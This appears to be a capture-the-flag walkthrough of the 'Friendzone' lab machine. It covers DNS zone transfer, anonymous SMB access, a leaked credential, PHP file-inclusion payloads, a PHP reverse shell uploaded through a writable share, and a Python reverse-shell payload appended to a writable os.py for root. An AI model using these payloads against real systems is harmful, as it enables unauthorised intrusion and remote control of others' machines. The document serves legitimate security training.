# Friendzone

# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```powershell
export IP=10.10.10.123
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

## Port 80, 443: HTTP/HTTPS

With no lead, we can look at the webpage first:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%202.png)

This gives us friendzoneportal.red as another possible domain.

Looking at the source of the page does not give us anything more useful.

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%203.png)

Similarly, looking at the feroxbuster results that is automatically run with Autorecon, we see no real results apart from the index.html that we just viewed and robots.txt:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%204.png)

However, robots.txt does not offer anything useful either:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%205.png)

HTTPS does not seem to be accessible to us via the browser.

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%206.png)

Looking at the results from feroxbuster for https, we see nothing really useful either:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%207.png)

## Port 53: DNS

To enumerate the DNS port, we first look at the dns reverse lookup that is automatically run with AutoRecon.

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%208.png)

However, this does not seem to yield any results. Next, we try to use nslookup to get some domain information:

```bash
nslookuup
server 10.10.10.123
10.10.10.123
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%209.png)

However, this turned up fruitless too. Lastly, we can try to perform zone transfer requests using the command dig for the two domain names that I found:

```bash
dig axfr friendzone.red @$IP > domains.txt
dig axfr friendzoneportal.red @$IP >> domains.txt
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2010.png)

To process this file, we can use grep and awk:

```bash
cat domains.txt | grep 'friendzone' | grep 'IN' | awk '{print $1}' | awk '!seen[$0]++' | sed 's/\.$//g' | sort -u
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2011.png)

From there, we can just use vim to move them into one line so that we can add it into /etc/hosts. 

```bash
echo "10.10.10.123 admin.friendzoneportal.red administrator1.friendzone.red files.friendzoneportal.red friendzoneportal.red friendzone.red hr.friendzone.red imports.friendzoneportal.red uploads.friendzone.red vpn.friendzoneportal.red" >> /etc/hosts
```

## Port 139, 445: SMB

From there, we can move on to enumerating the SMB service via smbmap:

```bash
smbmap -H $IP
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2012.png)

The results give us a a few pieces of information:

- We have read access on general
- We have read write access on Development
- Files file share being located at /etc/Files likely indicates that the general and Development might be in /etc/general and /etc/Development respectively

Leveraging on the access we have on anonymous login, we can use smbmap to enumerate through the files of the two shares that we have read access to:

```bash
smbmap -R  general -H $IP --depth 5
smbmap -R  Development -H $IP --depth 5
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2013.png)

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2014.png)

Development seems to be completely empty, but general seems to have credentials we might be able to access. To download it, we can run:

```bash
smbmap -R general -H $IP --depth 1 -A "creds.txt" -q
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2015.png)

The credentials we obtained are: “admin:WORKWORKHhallelujah@#”

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2016.png)

From there, nothing seems to be interesting about the SMB service anymore.

## Port 80, 443 with new domains and credentials

From here, we can then start visiting some of the subdomains we found. To parse through them quickly, we can run it through aquatone:

```bash
cat sorted.txt | aquatone
```

From the results, we see that we can visit 5 out of the 9 domain names that we found. Their links and what they support are as follows:

    With the credentials we found on the SMB service,  “admin:WORKWORKHhallelujah@#”, we can try to login to this portal
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2023.png)
    
    And we get in! At /dashboard.php:
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2024.png)
    
    Trying the default values of “image_id=a.jpg&pagename=timestamp”, we see:
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2025.png)
    
    This displays what seems to be a.jpg, and a timestamp value. If we refresh the page repeatedly, we see that the value for timestamp changes continuously:
    
    This tells us that:
    
    - We might be dealing with some php script
    - We can try to show images
    - We have access to parameters for dashboard.php
    
    For the first parameter image_id, we can try to change it to x.jpg, and we will see the following:
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2026.png)
    
    The image doesn’t seem to load, and if we right click on the image icon and open the image on a new tab, we see that: 
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2027.png)
    
    This tells us that dashboard.php is loading images directly by appending the image_id attribute with the value we supply it with. 
    
    Furthermore, if we refresh the page repeatedly, we see that the value for timestamp changes continuously:
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2028.png)
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2029.png)
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2030.png)
    
    This likely means that the timestamp value comes from a script of some sort. Seeing that the clues point at a php developer, the script is likely to be in php. The filename parameter is likely to follow a similar mechanism with the image_id parameter, and includes files via the supplied value. In that case, we can try and can verify that by accessing “https://administrator1.friendzone.red/timestamp.php”, which gives us:
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2031.png)
    
    If that is the case, the filename parameter seems to take the value we give it, append “.php” to it, and load the script the url points to. However, as there seems to be parameter inclusion for dashboard.php, we can use it to obtain the source of the php files being used. To obtain the encoded source for dashboard.php, we run:
    
    ```bash
    https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=dashboard
    ```
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2032.png)
    
    Copying the text we are shown, we can decode it from base64 and save it as dashboard.php locally using the command:
    
    ```bash
    echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 --decode > dashboard.php

    The contents of the file are:

    //echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

    $auth = $_COOKIE["FriendZoneAuth"];
    
    if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
    	echo "<br><br><br>";
    
    	echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";

    	}
    }else{
    	echo "<center><p>You can't see the content ! , please login !</center></p>";
    }
    ?>
    ```
    
    This confirms our suspicion. As we directly include the file, we can perhaps make use of the /etc/Development share that we had found during our smb enumeration.
    
    To test our suspicion, we can create a test script, test.php, containing the following:
    
    ```php
    <?php
    echo "Test test test";
    ?>
    ```
    
    We can then log in to the share anonymously using smbclient with:
    
    ```php
    smbclient //$IP/Development -N
    ```
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2033.png)
    
    We can upload the file onto the share using:
    
    ```php
    put test.php
    ```
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2034.png)
    
    We can then try to include the file we uploaded by visiting the link:
    
    ```php

    ```
    
    ![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2035.png)
    
    And we see our test script running successfully.

# Initial Foothold

To gain a reverse shell, we should upload the php reverse shell from pentestmonkey to the smb Development share and access it via the web page. Upon crafting the payload, we can upload it onto the share using the command:

```php
put php-reverse-shell.php
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2037.png)

From there, we set up a listener using:

```php
nc -nvlp 4444
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2038.png)

Then we simply visit:

```php
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
```

And on our listener we see: 

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2039.png)

To upgrade the netcat shell, we first run:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2040.png)

This gives us a partially interactive bash shell. To upgrade our shell to a full shell, we first press Ctrl+Z and run the following command:

```bash
stty raw -echo
```

Lastly, we can run the command "fg" to bring the listener back into the foreground:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2041.png)

# User Flag

With this shell, we can try to look for the user flag:

```php
locate user.txt
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2042.png)

# Root Flag

To escalate our privileges, we first run enumeration with linux smart enumeration by uploading the script to the Development share:

```php
put lse.sh
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2043.png)

From the user shell, we move it to /tmp/, give it access rights:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2044.png)

We can then use the script command to run the lse script:

```php
script -q -c "./lse.sh -i -l 2" output.txt
```

We can then move it to the development file share, and download it onto our Kali machine:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2045.png)

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2046.png)

After examining the output, there does not seem to be anything interesting. In a similar way, I have also tried running Linux Exploit Suggester and LinEnum, but there does not seem to be anything noteworthy. However, when running the binary pspy, which lists processes running on a machine, an interesting entry was found:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2047.png)

This process is interesting because the person who executes has UID of 0, which is root, and [reporter.py](http://reporter.py) is not a standard file on UNIX systems. 

```php
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

# Sam ~ python developer
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2048.png)

However, we do not have write access to the file, as can be seen from the ACL above. Despite that, the file does actually import os, which we might be able to modify. To find the file, we use the locate command:

```php
locate os.py
```

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2049.png)

Seeing that we are using the shell, we can find the likely version of python reporter.py uses by finding the version python resolves to using python --version:

Let us look at the permissions on os.py for python 2.7:

![Untitled](Friendzone%2001bd532e6d4245b391276435dd113c6d/Untitled%2051.png)

We see that we have full access to the file [os.py](http://os.py). To modify it to spawn a reverse shell, we append the following code to the bottom of os.py on our local Kali machine:

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.90",4445));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Then in the same way we have done before, we upload the file into /etc/Development:

From there, we copy os.py to replace the os.py that reporter.py will import:

```python
mv /usr/lib/python2.7/os.py /usr/lib/python2.7/os.py2
mv /etc/Development/os.py /usr/lib/python2.7/
```

Then all we have to do is set up a listener on our local machine and wait for reporter.py to execute:

When we get a connection, we see that we have a root shell:

From there, we use locate and cat to get the root flag:

# Learning Points (Additional Points)

- When u see a different page for 443 and 80, it implies that there is virtual hosts routing configuration. This means that if we discover other hosts we need to enumerate them over both HTTP and HTTPS since we might get different results
- Learn to use grep to process page
- Learn to use awk to print only one term/variable
- Use aquatone to parse through files
    - Rmb to give permissions to ss for aquatone

- Changing file contents can try for PHP extensions
- Can try to leak php source via php parameter query:
    - var=php://filter/convert.base64-encode/resource=RESOURCE_NAME
- Try including index.html and index.php to determine type of file the page uses
